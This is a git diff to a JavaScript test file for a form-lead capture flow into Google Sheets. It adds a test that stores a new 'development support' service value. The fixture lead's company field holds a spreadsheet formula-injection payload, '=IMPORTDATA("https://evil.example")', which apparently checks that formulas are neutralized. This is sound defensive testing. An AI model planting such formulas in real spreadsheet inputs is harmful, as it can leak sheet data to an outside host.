@@ -3,7 +3,7 @@ import assert from 'node:assert/strict';
 import { readFileSync } from 'node:fs';
 import { createHash } from 'node:crypto';
 import vm from 'node:vm';
-import { isValidPhone, isValidEmail, isValidName } from '../client/shared/leads.js';
+import { isValidPhone, isValidEmail, isValidName, DEVELOPMENT_SERVICE } from '../client/shared/leads.js';
 
 function integration() {
   const properties = new Map();
@@ -31,6 +31,12 @@ function integration() {
   return { context, rows, properties, cache, post };
 }
 const lead = { firstName: 'Asha', email: 'asha@example.com', phone: '+91 98765 43210', receipt: 'a'.repeat(32), company: '=IMPORTDATA("https://evil.example")' };
+
+test('Sheets accepts and stores development support through the existing Anvexa capture flow', () => {
+  const { rows, post } = integration();
+  assert.equal(post({ ...lead, service: DEVELOPMENT_SERVICE }).ok, true);
+  assert.equal(rows[1][6], DEVELOPMENT_SERVICE);
+});
 
 test('Apps Script validates, neutralizes formulas and confirms only a saved row', () => {
   const { context, rows, post } = integration();
